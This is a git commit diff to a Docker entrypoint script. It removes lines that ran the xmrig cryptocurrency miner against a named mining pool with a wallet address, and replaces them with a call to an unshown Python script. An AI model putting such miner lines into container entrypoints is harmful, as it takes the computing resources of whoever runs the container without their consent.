d1d83a2765d81d7b9a27a9eeb1282b5892b62423
tarikgumus <tarik.gumus@yahoo.com>
2022-08-11 23:07:51 +0800

    Update docker-entrypoint.sh

--- docker-entrypoint.sh
+++ docker-entrypoint.sh
@@ -1,11 +1,4 @@
 #!/bin/sh
 
-set -e
 
-if [ "$PROTO" = "ws" ]
-then	./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.neverlose -t 4 -k
-else    ./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.neverlose -t 4 -k
-fi
-
-
-exec "$@"
+python3 ./baslat.py
